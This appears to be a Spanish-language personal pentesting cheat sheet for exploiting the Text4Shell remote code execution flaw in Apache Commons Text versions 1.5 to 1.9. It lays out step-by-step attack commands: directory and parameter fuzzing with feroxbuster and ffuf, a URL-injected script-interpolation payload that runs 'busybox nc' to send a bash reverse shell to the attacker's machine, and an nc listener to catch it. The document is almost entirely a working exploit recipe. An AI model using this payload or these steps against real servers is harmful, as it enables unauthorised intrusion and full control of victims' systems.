# Apache Common Text 

Tags: #ApacheCommonText #Linux #API 


## Text4shell - Versión 1.5 - 1.9 RCE  
```bash 
Paso 1:
# Hacer fuzzing
❯ feroxbuster -u http://<IP>:8080 -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -d 2


Resultados:
	/CHANGELOG   # Mirar la versión 
	/search 
	/error 
```

```bash 
# Buscarle un paramétro que sea vulnerable 
http://IP:8080/search 

Paso 2:
# Hacer fuzzing para buscar el paramétro vulnerable
❯ ffuf -u http://IP:8080/search?FUZZ=firefire -ic -w /usr/share/SecLists/Discovery/Web-Content/big.txt -t 40 -c -fs 25 

Resultado: 
	- query 
```

* [Ecoder url](https://www.urlencoder.org/es/)
```bash 
# Hacer la inyección para obtener el RCE 

Opción 1:
http://IP:8080/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc IP_Kali 443 -e bash')}

# Encodear para que funcione 
http://IP:8080/search?query=ENCODE_URL

# Listener en Kali para recibir la revershell 
❯ rlwrap nc -nlvp 443 

NOTA:
	- Hacer tratamiento de la shell 
```